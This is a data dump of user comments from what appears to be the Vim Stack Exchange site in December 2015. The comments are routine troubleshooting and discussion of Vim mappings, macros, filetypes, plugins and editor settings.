  <row Id="9010" PostId="5841" Score="1" Text="Not sure, but maybe your script `myscript.sh` includes a new line character at the end of its output. ^@ is the caret notation of a null character (https://en.wikipedia.org/wiki/Null_character). You could try getting rid of it like this: `let db=system(&quot;myscript.sh &quot; . expand(&quot;%:p&quot;))[:-2]` or `let db=substitute(system(&quot;myscript.sh &quot; . expand(&quot;%:p&quot;), '\n$', '', '')` or `let db=substitute(system(&quot;myscript.sh &quot; . expand(&quot;%:p&quot;), '[[:cntrl:]]', '', 'g')`. Not tested so I don't know if any of these commands will work in your particular case. Found them here : http://superuser.com/a/935646" CreationDate="2015-12-16T12:51:58.270" UserId="4939" />
  <row Id="9011" PostId="5841" Score="0" Text="@muru Thanks. The myscript.sh indeed uses -print0 in the 'find' command." CreationDate="2015-12-16T12:54:29.937" UserId="1378" />
  <row Id="9012" PostId="5841" Score="0" Text="@saginaw Thanks, your answer solves the issue." CreationDate="2015-12-16T12:55:54.660" UserId="1378" />
  <row Id="9015" PostId="5842" Score="2" Text="Maybe a file has remapped your `&lt;C-]&gt;` key. To find out which one, type: `:verbose nmap &lt;C-]&gt;`" CreationDate="2015-12-16T13:16:15.340" UserId="4939" />
  <row Id="9017" PostId="5842" Score="0" Text="@saginaw vim echo `No mapping found `" CreationDate="2015-12-16T13:33:51.963" UserId="5510" />
  <row Id="9018" PostId="5843" Score="0" Text="I use the 'find' for listing files in the project directory tree, which are used for building db (cscope work only with *.c files by default). But 'find' works OK without -print0 as well (-print0 is needed for filenames with \n, as I understand)." CreationDate="2015-12-16T13:50:02.440" UserId="1378" />
  <row Id="9019" PostId="5843" Score="0" Text="@AlBerger `-print0` is useful if you're handling multiple files in the output, but from what you have said so far, it seems to me the script only outputs one filename." CreationDate="2015-12-16T13:53:14.393" UserId="205" />
  <row Id="9020" PostId="5842" Score="0" Text="@saginaw Note that `:tag {keyword}` went wrong too. If I have remapped my `&lt;C-]&gt;` key, `:tag {keyword}` should work right at least." CreationDate="2015-12-16T13:55:46.427" UserId="5510" />
  <row Id="9021" PostId="5842" Score="2" Text="@FengYu Yes you're right. Maybe there's a problem with the tags file and how it was created. You say it works when you start vim like this `vim -u NONE` but not when you start vim with an empty vimrc file and .vim/ folder. I may be wrong, but it seems to suggest a file is messing with the behavior of your mappings / commands. If you start vim like this : `vim -u NORC`, all initializations from files and environment variables are skipped except plugins. Is the issue still there when you start vim like this ?" CreationDate="2015-12-16T14:06:06.670" UserId="4939" />
  <row Id="9022" PostId="5842" Score="0" Text="@FengYu Just a suggestion, type `vim --startuptime log1`, quit then type `vim -u NORC --startuptime log2`, quit then type `vim -u NONE --startuptime log3`, quit then type `vim -d log1 log2 log3`. Maybe it will help you find a file which is messing with your commands." CreationDate="2015-12-16T14:16:05.820" UserId="4939" />
  <row Id="9024" PostId="5843" Score="0" Text="Yes, the script outputs the name of the database, but it also rebuilds it when it's connected for the first time (the 'find' is used for rebuilding the database)." CreationDate="2015-12-16T14:40:15.273" UserId="1378" />
  <row Id="9025" PostId="5843" Score="0" Text="Well, if 'find' is used for rebuilding, then where the \0 comes from? =) I don't know. The file name is outputted with 'echo $dbname'. Anyways, the issue was solved by [:-2]" CreationDate="2015-12-16T14:43:49.233" UserId="1378" />
  <row Id="9026" PostId="5843" Score="0" Text="@AlBerger then we have a doubly impossible scenario: `echo` isn't going to print a NUL (not like that anyway), and `system` replaces NULs, as I previously noted." CreationDate="2015-12-16T16:55:43.177" UserId="205" />
  <row Id="9027" PostId="5845" Score="0" Text="Does replacing &lt;return&gt; with &lt;cr&gt; work?" CreationDate="2015-12-16T17:53:36.407" UserId="865" />
  <row Id="9028" PostId="5845" Score="9" Text="See `:h map-silent`" CreationDate="2015-12-16T18:26:27.100" UserId="1800" />
  <row Id="9030" PostId="5848" Score="0" Text="All this time I assumed `gc` only worked linewise anyway..." CreationDate="2015-12-16T20:47:00.920" UserId="4674" />
  <row Id="9032" PostId="5846" Score="2" Text="Instead of recreating and deleting the temporary file, you could truncate that file and reuse it again and again. That's how I do it for the changes plugin." CreationDate="2015-12-16T21:16:55.627" UserId="71" />
  <row Id="9035" PostId="5851" Score="2" Text="There's absolutely no point doing that; HJKL suck just as much as the arrows." CreationDate="2015-12-17T07:00:24.740" UserId="54" />
  <row Id="9036" PostId="5851" Score="3" Text="I think @romainl may be pointing out that it's more important to focus on using vim's powerful *motions* (like `w` for next word, `}` for next paragraph, `n` for next search result match, `fz` for next occurrence of `z` in the current line, etc.) than moving more granularly by single characters. I definitely agree with this. However, HJKL are definitely better than the arrow keys in that you don't have to move your hands from the home row. I'll frequently type something like `jA`, which is a lot faster than `&lt;Down&gt;A`, and not really beatable by any motion." CreationDate="2015-12-17T07:45:06.153" UserId="142" />
  <row Id="9037" PostId="5852" Score="1" Text="There's also `&lt;nop&gt;` if you want to disable the keymap altogether: `nnoremap h &lt;nop&gt;`." CreationDate="2015-12-17T08:09:03.383" UserId="246" />
  <row Id="9038" PostId="5851" Score="2" Text="@romainl: I think I had this discussion with you before. Non-vimmers are used to arrows, and not used to HJKL. Ideally you don't want to use either; but blocking arrows (and not HJKL) will make people pause and reflect on what they are doing (while still leaving HJKL open as an alternative in case it is actually the best option, or in case the user is stumped on how to do it with more powerful motions.). I.e. it is not about learning HJKL, it is about blocking the automatism learned in other editors." CreationDate="2015-12-17T08:19:19.717" UserId="4729" />
  <row Id="9039" PostId="5845" Score="0" Text="Great, using `&lt;silent&gt;` does it!" CreationDate="2015-12-17T09:56:04.050" UserId="5370" />
  <row Id="9040" PostId="5851" Score="0" Text="@WChargin I see your point, and it is very much valid. I think blocking the hjkl keys will be the next step once I am more familiar with the advanced movements." CreationDate="2015-12-17T10:09:56.877" UserId="5449" />
  <row Id="9041" PostId="5846" Score="0" Text="Thanks Christian, that's a good idea.  I'll do it." CreationDate="2015-12-17T10:48:29.543" UserId="1643" />
  <row Id="9042" PostId="5855" Score="1" Text="AFAIK, Vim syntax files can (and often will) specify if a certain syntax region, group etc. is to be spell-checked or not. See `:h spell-syntax`. Example for LaTeX: https://github.com/gerw/vim-tex-syntax/blob/master/syntax/tex.vim#L171" CreationDate="2015-12-17T11:55:04.903" UserId="1800" />
  <row Id="9043" PostId="5674" Score="0" Text="The key mappings: does mapping a simple key (like, say, `n`) work? As for the second error, `:help E10` says &quot;Remove the 'C' flag from the 'cpoptions' option to enable it. Or use :set nonocompatible&quot;." CreationDate="2015-12-17T12:36:33.990" UserId="51" />
  <row Id="9044" PostId="5605" Score="1" Text="Note: this has [since been posted on the issue tracker by the OP](https://github.com/inside/vim-search-pulse/issues/9), and it looks like the bug got fixed." CreationDate="2015-12-17T12:57:28.500" UserId="51" />
  <row Id="9045" PostId="5604" Score="2" Text="Ehm, Vim comes with markdown support, and has for a very long time..." CreationDate="2015-12-17T13:00:55.593" UserId="51" />
  <row Id="9046" PostId="5851" Score="0" Text="I, for one, am not at all convinced that hjkl keys are actually faster (or better in other ways) compared to arrow keys. Sure, there are plenty of anecdotes to this effect, but me personal experiences are different, and as any sceptical-minded person should know, anecdotal evidence is weak at best." CreationDate="2015-12-17T13:09:51.330" UserId="51" />
  <row Id="9047" PostId="5856" Score="1" Text="OK, thanks, I didn't know that. Does that mean (to use my example) that I'd have to modify the standard vim syntax file for text files? Or can I put this in my `.vimrc` somehow to modify an existing set of syntax rules?" CreationDate="2015-12-17T13:10:33.060" UserId="91" />
  <row Id="9049" PostId="5851" Score="0" Text="@Carpetsmoker What is definitely an upside of the hjkl keys is not having to leave the home row. For the arrow keys the hand has to move across the keyboard." CreationDate="2015-12-17T13:12:32.750" UserId="5449" />
  <row Id="9050" PostId="5851" Score="0" Text="@k0pernikus Yeah, that's what many people say... But does that mean it's actually faster or better? Not necessarily... Maybe it *is* (if it is, I would expect the different to be minimal), but I'm not convinced purely by the &quot;home-row argument'..." CreationDate="2015-12-17T13:17:02.147" UserId="51" />
  <row Id="9051" PostId="5851" Score="1" Text="@Carpetsmoker It's surely feels better to me. ;)" CreationDate="2015-12-17T13:25:51.293" UserId="5449" />
  <row Id="9052" PostId="5851" Score="0" Text="Okay :-) If you like it, then by all means use it. It's just that too often I see people struggling a lot with &quot;hjkl&quot; just because they think that's how it &quot;should be done&quot; or that it will give them great speed benefits." CreationDate="2015-12-17T13:31:47.233" UserId="51" />
  <row Id="9053" PostId="5251" Score="0" Text="As a fellow Pythonic tab-lover, a little heads-up: newer version of Vim need `autocmd FileType python setlocal ts=4 sts=4 sw=4 noexpandtab`, as `ftplugin/python.vim` overwrites this. I sent a message to the mailinglist about this, but it didn't get changed, so well :-/" CreationDate="2015-12-17T13:46:21.210" UserId="51" />
  <row Id="9054" PostId="5236" Score="0" Text="You should probably report this as a bug, if you haven't already." CreationDate="2015-12-17T13:48:23.607" UserId="51" />
  <row Id="9055" PostId="5236" Score="0" Text="It was already [asked](https://groups.google.com/d/msg/vim_use/MZtoTLwmeCo/aWe_9DaBBwAJ) and answered." CreationDate="2015-12-17T14:14:19.447" UserId="71" />
  <row Id="9056" PostId="3770" Score="1" Text="In case anyone else is curious about this: command-line tools such as `xsel`, `xclip`, etc. all &quot;cheat&quot; by forking and exiting the parent process." CreationDate="2015-12-17T14:49:14.250" UserId="51" />
  <row Id="9057" PostId="5864" Score="0" Text="I use `gqq` there or possibly some variation of `gqj` or `gq2j`" CreationDate="2015-12-17T17:01:24.530" UserId="5359" />
  <row Id="9058" PostId="5674" Score="0" Text="Only a few mappings. Stuff like `map q :quit&lt;CR&gt;` works, but stuff like `map &lt;S-F12&gt; :qall&lt;CR&gt;` doesn't. The `cpoptions` helped. I wan to build a vim of my own and test it, perhaps some debian maintainer disabled something when building vim." CreationDate="2015-12-17T17:36:05.277" UserId="5486" />
  <row Id="9059" PostId="5865" Score="2" Text="You can start from [here](http://vim.wikia.com/wiki/VimTip991) :)" CreationDate="2015-12-17T20:10:07.883" UserId="1800" />
  <row Id="9061" PostId="5861" Score="0" Text="The sidescrolloff is actually set to 5. The scrolling happens here so soon because of the sheer amount of the concealed characters, as the buffer contains a lot of color codes from terminal output." CreationDate="2015-12-17T23:41:30.800" UserId="1687" />
  <row Id="9062" PostId="5870" Score="3" Text="Well, technically, if you just do `:q`, Vim does warn about unsaved buffers." CreationDate="2015-12-18T01:51:01.723" UserId="205" />
  <row Id="9063" PostId="5870" Score="1" Text="Well, what have you done to gVim, that it doesn't do it for you? It always asks me about unsaved buffers when pressing the 'X'" CreationDate="2015-12-18T06:31:18.257" UserId="71" />
  <row Id="9064" PostId="5873" Score="1" Text="Why don't you just use `&lt;ctrl&gt;-` mappings directly, if that is what you want?" CreationDate="2015-12-18T07:33:04.980" UserId="21" />
  <row Id="9065" PostId="5876" Score="1" Text="Great answer. Hidden buffers is closest to what the question described: I like to use tabs for any unsaved buffers without `:set hidden`, but that's a matter of personal preference." CreationDate="2015-12-18T10:17:58.590" UserId="4655" />
  <row Id="9066" PostId="5870" Score="0" Text="The command `set confirm` might be close to what you're asking for" CreationDate="2015-12-18T10:25:00.583" UserId="4655" />
  <row Id="9067" PostId="5869" Score="0" Text="Does typing `q:` in normal mode do what you want?   (See `:help cmdline-window`)" CreationDate="2015-12-18T13:17:11.057" UserId="865" />
  <row Id="9068" PostId="5878" Score="2" Text="&quot;The first that exists is used, the others are ignored.&quot; `$VIMINIT` has precedent over any `.vimrc` file. And it satisfies the first come first served rule. So yes `.vimrc` is ignored." CreationDate="2015-12-18T13:28:33.370" UserId="544" />
  <row Id="9069" PostId="5863" Score="0" Text="Unrelated question: I've often felt there was a good use case for Ex-mode but I've yet to find myself using it. How do you utilize Ex-mode? What is your workflow with it?" CreationDate="2015-12-18T13:49:37.253" UserId="544" />
  <row Id="9070" PostId="5877" Score="1" Text="I'm already perfectly aware of what the problem is - I'm looking for a solution, not an explanation." CreationDate="2015-12-18T14:00:15.313" UserId="260" />
  <row Id="9071" PostId="5863" Score="0" Text="Sukima: this is one of my first stabs at using ex-mode - I wanted to use it to put `vim` at the end of a pipeline to emit the syntax-highlighted version of a file." CreationDate="2015-12-18T14:18:15.940" UserId="361" />
  <row Id="9072" PostId="5863" Score="1" Text="Ahh. I see the trouble. So what you want isn't useful. Vim doesn't have the ability to output text with VT100 escape codes. They can show color via ncurses but that isn't pipe-able. I suggest something like http://pygments.org/" CreationDate="2015-12-18T14:36:46.963" UserId="544" />
  <row Id="9073" PostId="5887" Score="0" Text="I'm not sure this does what you're asking. Maybe you could give a few lines of an example input and output?" CreationDate="2015-12-18T15:04:51.967" UserId="4655" />
  <row Id="9074" PostId="5887" Score="0" Text="Thank you for posting, but no, this would still result in the chat user and the text they typed being on separate lines." CreationDate="2015-12-18T15:06:48.193" UserId="1065" />
  <row Id="9075" PostId="5887" Score="0" Text="@leeand00 Think I understand. See the new oneliner at the start of this question" CreationDate="2015-12-18T15:15:53.520" UserId="4655" />
  <row Id="9076" PostId="5887" Score="0" Text="@Steve If you want the macro to run until it hits the end of the file, you can make it recursive. To make a macro recursive, first you have to clear the register in which you're going to store it. If it's a, then hit `qaq`. Then, begin the recording, and type whatever is needed. Just before ending the recording, hit `@a` so that the macro calls itself. If you have an already non-recursive macro in register a and want to make it recursive, there are 2 ways. From normal mode `qA@aq`, or from command line mode: `:let @a .= '@a'`" CreationDate="2015-12-18T15:49:55.200" UserId="4939" />
  <row Id="9077" PostId="5887" Score="0" Text="@saginaw I might have done it wrong, but I tried that and it didn't stop, possibly due to the fact that the `n` to find the next `&gt;` does the whole `search hit BOTTOM, continuing at TOP`" CreationDate="2015-12-18T16:02:03.850" UserId="4655" />
  <row Id="9078" PostId="5887" Score="1" Text="@Steve Yes you're right, in this particular case you would probably have to prevent vim from searching back from the beginning of the file after it hits the end, otherwise the macro will never end. To do so, go to the beginning of the file and type `set nowrapscan`. It should tell vim to stop at the end of the file. You can reenable the option afterwards if you want `set wrapscan`." CreationDate="2015-12-18T16:06:11.970" UserId="4939" />
  <row Id="9079" PostId="5877" Score="2" Text="The solution is to use the correct motion" CreationDate="2015-12-18T16:59:00.517" UserId="71" />
  <row Id="9080" PostId="5877" Score="0" Text="but thanks for downvoting..." CreationDate="2015-12-18T17:00:35.073" UserId="71" />
  <row Id="9082" PostId="5891" Score="0" Text="Thanks!  I was unaware of the join command." CreationDate="2015-12-18T19:06:09.637" UserId="1065" />
  <row Id="9083" PostId="5851" Score="0" Text="@WChargin, off-topic slightly, but I think &quot;Return `A`&quot; beats `jA`.  ;)  You can just slide your pinky directly from the &quot;Return&quot; key to the &quot;Shift&quot; key.  I never use arrow keys, and seldom use `hjkl`, but they need to be there for when they are needed.  (Also I tend to use `HML` a lot rather than repeatedly using `jk`.)" CreationDate="2015-12-18T19:23:36.813" UserId="4676" />
  <row Id="9084" PostId="5892" Score="0" Text="gah I've been jumping around languages lately and ive got a mix of JS and python in my brain hence the brackets! I'll take a look at that plugin, thanks. Was hoping for something that works out of the box though" CreationDate="2015-12-18T20:12:15.783" UserId="5716" />
  <row Id="9085" PostId="5890" Score="2" Text="That feature is available in *every* &quot;autoclosing&quot; plugin on vim.org." CreationDate="2015-12-18T20:37:06.810" UserId="54" />
  <row Id="9086" PostId="5877" Score="0" Text="Let me quote from the question: _&quot;Is there a combination of commands or a plugin that does this?&quot;_. Your answer doesn't answer this. I'm sure there must be some combination of commands or a plugin that provides a text object that is the current comment or paragraph." CreationDate="2015-12-18T21:14:07.333" UserId="260" />
  <row Id="9087" PostId="5890" Score="0" Text="Quick search for [&quot;bracket&quot; on VimAwsome](http://vimawesome.com/?q=bracket)" CreationDate="2015-12-18T21:59:37.740" UserId="778" />
  <row Id="9088" PostId="5873" Score="0" Text="because I don't want to override some built-in key mappings." CreationDate="2015-12-18T22:32:01.187" UserId="1276" />
  <row Id="9089" PostId="5875" Score="0" Text="Thanks for the plugins, they seem very interesting. I'll give a try." CreationDate="2015-12-18T22:33:43.800" UserId="1276" />
  <row Id="9090" PostId="5883" Score="0" Text="But this only works for a session, what about unsetting it definitely? or maybe searching where is the variable set, so you can go and delete it?" CreationDate="2015-12-19T05:53:40.610" UserId="5510" />
  <row Id="9091" PostId="5877" Score="0" Text="Yes it does. Let me rephrase: *if you know the problem, than you should know, that **ap** already does select the current paragraph*. If your and Vims definition of a paragraph differ, than either put an empty line there or use a **different** motion. That answers exact your question." CreationDate="2015-12-19T07:24:57.300" UserId="71" />
  <row Id="9092" PostId="5894" Score="4" Text="If you're asking, you don't need it. It's not like you *must* switch to Vim, or convince other people." CreationDate="2015-12-19T13:59:46.430" UserId="1800" />
  <row Id="9093" PostId="5877" Score="0" Text="I'm not looking for a motion - I'm looking for a text object, but that's just being nitpicky. I am already aware that I need a different text object, and that's what this question is for. My question effectively is &quot;`ap` is not the right text object, I want a text object that's the current comment or the current paragraph depending on context&quot;, and your answer is &quot;you need a different motion&quot;. It doesn't answer the question." CreationDate="2015-12-19T15:13:36.370" UserId="260" />
  <row Id="9094" PostId="5877" Score="1" Text="@ChristianBrabandt my comment of yesterday already shows more constructive information of what motions could be interesting. Well. In less words ar least" CreationDate="2015-12-19T15:19:56.247" UserId="5359" />
  <row Id="9095" PostId="5889" Score="0" Text="Tabular accepts regexes so it actually works for your example: `:Tabularize / &quot;.*`" CreationDate="2015-12-19T17:30:12.333" UserId="5682" />
  <row Id="9096" PostId="5877" Score="0" Text="@sehe I don't think my answer was not constructive. I explained the background and gave 3 different workarounds. I can't understand why someone insists one wanting to have the paragraph textobject behave differently." CreationDate="2015-12-19T18:17:42.073" UserId="71" />
  <row Id="9097" PostId="5877" Score="0" Text="@orlp There is no such text-object. I would have told you, if such an textobject exists. I gave you three different workarounds and even explained the background to you. Sorry, for trying to be helpful. Won't happen again." CreationDate="2015-12-19T18:19:47.823" UserId="71" />
  <row Id="9099" PostId="5901" Score="2" Text="You should create an issue for that at their bugtracker. neovim tries  to be compatible with vim, so this should just work." CreationDate="2015-12-20T08:10:46.780" UserId="71" />
  <row Id="9101" PostId="5869" Score="0" Text="@EvergreenTree ah, I should have made the distinction between the vim commandline and the commandline of the shell running in the terminal buffer more clear." CreationDate="2015-12-20T19:11:36.323" UserId="1472" />
  <row Id="9102" PostId="5900" Score="1" Text="@user3813057 You could also set `includeexpr`. In my .vimrc I have `set   includeexpr=substitute(v:fname,'[-:]\\d\\+[-:]\\?$','','')`, which strips trailing numbers when a `gf` fails (for dealing with things like error messages in the form `&lt;file&gt;-&lt;line&gt;: error`). You could do something similar here." CreationDate="2015-12-20T19:58:01.837" UserId="4620" />
  <row Id="9103" PostId="5900" Score="0" Text="@blm If you have the time, you should post it as an answer, maybe explaining a little how it works. It probably deserves its own answer." CreationDate="2015-12-20T20:21:17.610" UserId="4939" />
  <row Id="9104" PostId="5900" Score="0" Text="Ok, turned it into an answer." CreationDate="2015-12-20T22:01:33.220" UserId="4620" />
  <row Id="9105" PostId="5881" Score="0" Text="Yeah, I tend to use my vim (and bash) history as a repository of little one-liners, which works fine until something wipes them out, then I panic because I no longer know how to do anything. :-) So anything from my vim history I find myself using in multiples files and/or across editing sessions, I make them into commands. This also lets me name them and remember or look them up by name instead of trying to remember a unique prefix then doing a bunch of up arrows, and I can include comments with tricky ones to remind me how they work or what they're for." CreationDate="2015-12-20T22:23:47.810" UserId="4620" />
  <row Id="9106" PostId="4347" Score="0" Text="I don't see this behavior. I tried both vim local scp://... and two scp://...s . Have you tried upgrading your netrw? Its up to v155d now.&#xA;(http://www.drchip.org/astronaut/vim/index.html#NETRW)" CreationDate="2015-11-20T22:34:24.437" UserId="2377" />
  <row Id="9107" PostId="4347" Score="0" Text="Can you still reproduce this?" CreationDate="2015-12-20T23:10:46.953" UserId="205" />
  <row Id="9108" PostId="5903" Score="0" Text="Thank you very much for your answer ! I hope you won't mind, but I took the liberty of making a small edit to your answer. Just adding a mapping `&lt;leader&gt;g,` to call your function, and a local mapping `&lt;return&gt;` to close the scratch buffer and move the cursor automatically in the original buffer according to the entry in the change list on which the cursor was when Enter was pressed. Of course, if you don't like the edit, feel free to delete or change it however you like. Again, thank you for the quick answer !" CreationDate="2015-12-21T04:35:54.793" UserId="4939" />
  <row Id="9109" PostId="5905" Score="0" Text="What are you trying to do? [(XY Problem)](http://meta.stackexchange.com/a/66378/188334)" CreationDate="2015-12-21T11:42:46.520" UserId="1405" />
  <row Id="9110" PostId="5905" Score="0" Text="I'm trying to write a function to rotate window splits to vertical if current layout it's horizontal and vice versa when there're just two windows. So I need to know what's the current splits layout and where's my current window" CreationDate="2015-12-21T11:51:13.550" UserId="1276" />
  <row Id="9111" PostId="5903" Score="0" Text="No problem! This answer was made to be quick and tweakable." CreationDate="2015-12-21T12:31:04.993" UserId="865" />
  <row Id="9112" PostId="5905" Score="3" Text="Why not simply use `ctrl-W_L`? (or `ctrl-W_R`)" CreationDate="2015-12-21T14:09:27.973" UserId="599" />
  <row Id="9113" PostId="5909" Score="0" Text="I've observed a similar issue since the last W10 update. My opinion is that you should report it to cygwin mailing list." CreationDate="2015-12-17T08:25:40.763" UserId="626" />
  <row Id="9114" PostId="5909" Score="0" Text="@shellter: I actually did some searching to inform my guess of which SE site to use for this question. Naturally, I guessed wrong." CreationDate="2015-12-17T14:46:12.620" UserDisplayName="psmay" />
  <row Id="9115" PostId="5907" Score="1" Text="I know it doesn't answer your question fully, but on this link : http://docs.freebsd.org/44doc/usd/12.vi/paper-8.html, when they talk about `^]`, they say: `Mnemonically, this command is ''go right to'' (7.3).`" CreationDate="2015-12-21T20:06:00.393" UserId="4939" />
  <row Id="9116" PostId="5881" Score="3" Text="Now apply the same rule to bash and define aliases for those one-liners ;)" CreationDate="2015-12-21T20:37:10.630" UserId="599" />
  <row Id="9117" PostId="5720" Score="0" Text="You can also format your whole file by typing `:%!fmt` and undo with a single `u` if you don't like the result." CreationDate="2015-12-21T22:26:46.423" UserId="4676" />
  <row Id="9118" PostId="5905" Score="0" Text="I want it to be convenient toggle function, it will automatically detect the current layout and do the correct rotation for me instead that I need to think it in my brain and choose the right command to use. All I need to do is always hit the same key mapping." CreationDate="2015-12-21T22:55:08.837" UserId="1276" />
  <row Id="9119" PostId="5914" Score="1" Text="Thank you very much ! That was bothering me since a long time, and never found the solution. I modified my vimrc with `inoremap &lt;C-h&gt; &lt;C-g&gt;U&lt;Left&gt;` and `inoremap &lt;C-l&gt; &lt;C-g&gt;U&lt;Right&gt;` and your solution works perfectly ! By the way, on my linux machine I've got the same weird output as you for the `:registers` command, so it's not coming from windows." CreationDate="2015-12-22T01:28:59.653" UserId="4939" />
  <row Id="9120" PostId="5905" Score="0" Text="@AaronShen Have a look at [the window restoring commands](http://vimhelp.appspot.com/eval.txt.html#winrestcmd%28%29)." CreationDate="2015-12-22T03:18:25.453" UserId="205" />
  <row Id="9121" PostId="5907" Score="2" Text="@saginaw That version of *An Introduction to Display Editing with vi* is a bit updated (they added a new section, so 7.3 should be 8.3). In any case, the relevant section ([*More File Manipulation Commands*](http://ex-vi.sourceforge.net/viin/paper-7.html#section48)) doesn't mention `^]`, but only `:ta`. I'm going to tag this with `original-vi`, Vim's earliest version I could find (1.4) had this in 1991, so presumably it's a `vi` thing." CreationDate="2015-12-22T03:42:36.967" UserId="205" />
  <row Id="9122" PostId="5914" Score="2" Text="`&lt;c-g&gt;U` came with a recent patch. That may explain why you missed it so far." CreationDate="2015-12-22T08:03:35.423" UserId="626" />
  <row Id="9123" PostId="5891" Score="0" Text="Ah, I thought without g it would stop after first match. Thanks for pointing this out" CreationDate="2015-12-22T15:27:55.200" UserId="4655" />
  <row Id="9124" PostId="5920" Score="1" Text="looks like pathogen is not installed. What have you done? Can you please show your directory structure? Did you follow the [installation instruction](https://github.com/tpope/vim-pathogen#installation)?" CreationDate="2015-12-22T16:29:16.573" UserId="71" />
  <row Id="9126" PostId="5920" Score="2" Text="Use the one in your home directory. The others should NOT be touched." CreationDate="2015-12-22T16:36:05.637" UserId="71" />
  <row Id="9127" PostId="5920" Score="0" Text="OK, but should I now restore the other ones to their default settings or leave them alone?" CreationDate="2015-12-22T16:44:06.553" UserId="5758" />
  <row Id="9128" PostId="5908" Score="0" Text="Thanks. Sounds like a good idea and a good way to get familiar with the plugin. Will look at it." CreationDate="2015-12-22T19:25:15.057" UserId="5720" />
  <row Id="9129" PostId="5920" Score="3" Text="You need to revert your system-wide vimrc to its pristine state." CreationDate="2015-12-22T21:23:54.370" UserId="54" />
  <row Id="9130" PostId="5920" Score="1" Text="`~/vimrc` is a typo? Should be `~/.vimrc`." CreationDate="2015-12-23T04:40:46.087" UserId="1145" />
  <row Id="9131" PostId="5925" Score="2" Text="... and when using GVim?" CreationDate="2015-12-23T05:30:01.693" UserId="205" />
  <row Id="9132" PostId="5925" Score="2" Text="`:shell` is the way to go or alt tabbing in to your other favorite terminal emulator" CreationDate="2015-12-23T05:32:58.680" UserId="5763" />
  <row Id="9133" PostId="5926" Score="2" Text="Create a function, then a command that executes the function, then map the command." CreationDate="2015-12-23T10:44:16.450" UserId="1800" />
  <row Id="9134" PostId="5926" Score="2" Text="Yep. This is the job of functions." CreationDate="2015-12-23T10:45:16.393" UserId="205" />
  <row Id="9135" PostId="5926" Score="1" Text="@VanLaser - What does `:!%:p:r.exe&lt;CR&gt;` translate into in a vimrc function?" CreationDate="2015-12-23T10:48:09.187" UserId="5768" />
  <row Id="9136" PostId="5926" Score="1" Text="Should be the same thing ... execute in the shell the root component of the current edited filename, with `.exe` suffix appended. See `:h filename-modifiers`." CreationDate="2015-12-23T10:55:52.747" UserId="1800" />
  <row Id="9137" PostId="5923" Score="0" Text="If I want to move the cursor for two characters, I can just use `2l`, that's the whole point of the question to use the amount modifier. And I still would be able two press j twice in a short succession. I only want the repeat to stop when keeping the button pressed down." CreationDate="2015-12-23T13:09:29.697" UserId="5449" />
  <row Id="9138" PostId="4774" Score="0" Text="Related: [How to paste before the cursor after selecting a vertical block?](http://stackoverflow.com/q/4073731/55075) at SO" CreationDate="2015-12-23T14:23:24.053" UserId="467" />
  <row Id="9139" PostId="5929" Score="2" Text="Well, you could do `:s:':&quot;:g`" CreationDate="2015-12-23T15:34:45.973" UserId="5763" />
  <row Id="9140" PostId="5925" Score="1" Text="I always like `!git checkout [branchname]`" CreationDate="2015-12-23T18:46:06.020" UserId="14" />
  <row Id="9141" PostId="5931" Score="1" Text="I think the reason is the `a` flag in `formatoptions`, which tells Vim to automatically reformat a paragraph after text is inserted or deleted. Apparently, Vim sees that `vipJ` as having inserted and/or deleted text, so it reformats the paragraph, restoring the original line breaks. One way to fix the problem is to execute `:setlocal fo-=a` before executing `vipJ`." CreationDate="2015-12-23T18:56:20.680" UserId="2055" />
  <row Id="9142" PostId="5932" Score="1" Text="How come you don't need to use the `g` flag?" CreationDate="2015-12-23T19:32:28.373" UserId="978" />
  <row Id="9143" PostId="5934" Score="1" Text="It's `fugitive`, not `fugative`, and that's what OP is already using." CreationDate="2015-12-23T20:07:02.630" UserId="205" />
  <row Id="9144" PostId="5934" Score="1" Text="Awesome answer. `vim-merginal` is what I was looking for." CreationDate="2015-12-23T20:09:22.637" UserId="3216" />
  <row Id="9145" PostId="7" Score="0" Text="simply `set rnu!` toggles relative and absolute numbers too" CreationDate="2015-12-23T22:30:44.687" UserId="5774" />
  <row Id="9146" PostId="5932" Score="4" Text="Because of `:help 'gdefault'`." CreationDate="2015-12-23T22:30:51.167" UserId="54" />
  <row Id="9147" PostId="5932" Score="2" Text="Life changed forever" CreationDate="2015-12-23T22:34:13.657" UserId="978" />
  <row Id="9148" PostId="5937" Score="0" Text="`setf sql.php` to set multiple filetypes on a file. To automate this: `autocmd FileType php setf sql.php`" CreationDate="2015-12-24T01:37:33.203" UserId="5763" />
  <row Id="9149" PostId="5937" Score="0" Text="thanks, its a good idea, but unfortunately it doesn't work" CreationDate="2015-12-24T01:53:15.837" UserId="4603" />
  <row Id="9150" PostId="5939" Score="0" Text="thanks muru, it works! so basically this code snippet says: if  `SQL_SetType` hasn't been set that means `sql.vim` hasn't run - so run the  `set ft=sql set ft=php` commands - the `set ft=php` will cause your snippet to re-run - but your if condition will protect against the recursion (kind of like putting up shields to protect against disruptor fire - I guess...)" CreationDate="2015-12-24T05:18:59.900" UserId="4603" />
  <row Id="9151" PostId="5939" Score="0" Text="@the_velour_fog yep. If you're familiar with C, it's like an [include guard](https://en.wikipedia.org/wiki/Include_guard). Note also that I used `~/.vim/ftplugin`, and not `after/ftplugin`, since I want this to run as early as possible, so that a minimum of PHP-related code is called twice." CreationDate="2015-12-24T05:39:49.050" UserId="205" />
  <row Id="9152" PostId="5940" Score="1" Text="Ok, so when I said that `exists()` did not evaluate the variable, I was wrong. `exists()` is no different than `strlen()`, `glob()` or any other function.&#xA;No matter the function, Vim always evaluates the variable before sending the result to the function.&#xA;Usually this is what you want. But not with `exists()`, because usually you don't want to check whether the contents of a variable exists but whether the variable itself exists. So, the quotes are here to tell Vim: &quot;don't evaluate the variable, leave it as it is&quot;." CreationDate="2015-12-24T05:40:24.190" UserId="4939" />
  <row Id="9153" PostId="5939" Score="0" Text="Thanks for the explanation, I was wondering why you did that. Yes I am familiar with the programming pattern of include guards, but annoyingly I don't know vimscript, so I couldn't write something like your code snippet!" CreationDate="2015-12-24T05:45:30.570" UserId="4603" />
  <row Id="9154" PostId="5939" Score="0" Text="@the_velour_fog if it helps, I didn't write it. I just lifted it from `sql.vim`. :P" CreationDate="2015-12-24T05:46:28.037" UserId="205" />
  <row Id="9155" PostId="5916" Score="0" Text="I’m wondering if you tried to start vim with all those files passed as arguments? I mean something like: `vim $(find . -name ver*.c)`" CreationDate="2015-12-24T10:50:10.617" UserId="4922" />
  <row Id="9156" PostId="5911" Score="0" Text="Or undotree: https://github.com/mbbill/undotree/" CreationDate="2015-12-24T11:43:01.353" UserId="428" />
